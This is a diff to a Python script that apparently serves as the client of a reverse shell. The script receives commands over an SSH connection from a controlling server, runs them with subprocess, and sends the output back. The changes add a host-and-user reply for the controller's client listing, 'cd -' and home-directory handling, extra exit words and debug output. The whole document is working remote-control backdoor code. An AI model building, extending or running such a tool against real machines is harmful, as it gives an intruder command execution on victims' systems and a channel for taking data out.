@@ -28,12 +28,13 @@ def createStyle():
 
 def verbose_print(to_print):
     if args.verbose:
-        print(warning + to_print)
+        print(warning + '[DEBUG] ' + to_print)
 
 ip = args.server
 port = args.port
 username = args.username
 password = args.password
+global path_history
 
 def SSH_comm():
         
@@ -56,18 +57,35 @@ def SSH_comm():
             try:
                 SSH_command = command.decode()
 
-                if SSH_command.strip() == 'exit': #kill shell if recieve 'exit'
+                if SSH_command.strip() in ('exit', 'quit'): #kill shell if receive 'exit' or 'quit'
                     open_SSH_session.send(f'Closing connection from {host_name} ({ip}).')
                     sys.exit()
+
+                if SSH_command.strip() == ('list_me'): #reply to ::clients command with host info
+                    open_SSH_session.send(f'{current_user} on {host_name} ({ip}).')
+                    continue
                 
                 if SSH_command.split(" ")[0] == 'cd': #this is needed to change directories
+                    global path_history
+                    
                     path = SSH_command.split(" ")[1]
+
+                    if path == '-':
+                        os.chdir(path_history)
+                        open_SSH_session.send(f'{path_history}') #return new current dir from command to server
+                        continue
+                    if '~' in path:
+                        path = path.replace('~', f'/home/{current_user}')
+
+                    path_history = os.getcwd()
+                    verbose_print(f'The current path history is {path_history}')
                     os.chdir(path)
                     newdir = os.getcwd()
                     open_SSH_session.send(f'{newdir}') #return new current dir from command to server
+                    continue
                 else:
                     SSH_command_output = subprocess.check_output(shlex.split(shlex.quote(SSH_command)), stderr=subprocess.STDOUT, shell=True)
-                    verbose_print(f'The command returned: {SSH_command_output.decode()}')
+                    verbose_print(f'The command returned: \n{SSH_command_output.decode()}')
                     if SSH_command_output.decode() == '': #This is needed for commands that do not return anything, such as mkdir, rm, etc.
                         SSH_command_output = '\n' #return SOMETHING so the server doesn't hang waiting for a reply
                     open_SSH_session.send(SSH_command_output) #return output from command to server
